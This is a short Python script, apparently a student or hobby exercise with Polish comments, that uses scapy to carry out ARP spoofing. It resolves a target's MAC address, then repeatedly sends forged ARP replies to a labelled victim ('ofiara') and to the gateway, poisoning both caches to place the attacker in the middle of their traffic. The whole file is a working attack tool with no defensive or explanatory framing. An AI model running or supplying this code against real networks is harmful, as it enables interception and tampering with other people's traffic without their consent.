from scapy.all import ARP, Ether, send
import time

from scapy.sendrecv import srp


def spoof(target_ip, spoof_ip):
    arp_response = ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
    send(arp_response, verbose=False)

def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    request_packet = broadcast / arp_request
    response = srp(request_packet, timeout=2, verbose=False)[0]
    return response[0][1].hwsrc

target_ip = "192.168.1.10"  # ofiara
gateway_ip = "192.168.158.178"  # router (ja)

try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        time.sleep(2)
except KeyboardInterrupt:
    print("\nZakończono atak ARP spoofing")
